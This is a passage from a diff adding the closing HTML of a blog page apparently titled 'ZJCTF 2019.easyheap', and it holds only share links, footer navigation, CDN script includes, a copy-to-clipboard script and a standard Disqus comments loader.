+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&name=ZJCTF 2019.easyheap&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/21/ZJCTF-2019-easyheap/&t=ZJCTF 2019.easyheap"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
